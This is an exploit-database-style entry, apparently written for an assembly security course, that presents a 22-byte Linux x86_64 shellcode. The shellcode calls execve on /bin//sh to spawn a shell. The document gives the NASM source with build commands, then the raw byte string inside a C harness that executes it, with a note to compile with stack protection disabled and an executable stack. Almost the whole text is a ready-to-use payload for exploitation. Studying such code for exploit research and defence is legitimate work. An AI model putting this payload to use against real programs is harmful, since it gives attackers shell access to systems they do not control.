;Title: execve shellcode 22 bytes
;Author: d4sh&r
;Contact: https://mx.linkedin.com/in/d4v1dvc
;Category: Shellcode
;Architecture:linux x86_64
;SLAE64-1379
;Description:
;Shellcode in 22 bytes to get a shell
;Tested on : Linux kali64 3.18.0-kali3-amd64 #1 SMP Debian 3.18.6-1~kali2 x86_64 GNU/Linux

;Compilation and execution
;nasm -felf64 shell.nasm -o shell.o
;ld shell.o -o shell
;./shell

global _start

_start:
	mul esi
	push rdx
	mov rbx, 0x68732f2f6e69622f ;/bin//sh
	push rbx
	lea rdi, [rsp] ;address of /bin//sh
	mov al, 59 ;execve
	syscall

/*compile with gcc -fno-stack-protector -z exestack */

unsigned char code[] = "\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";

main()
{
   int (*ret)()=(int(*)()) code;
    ret();
}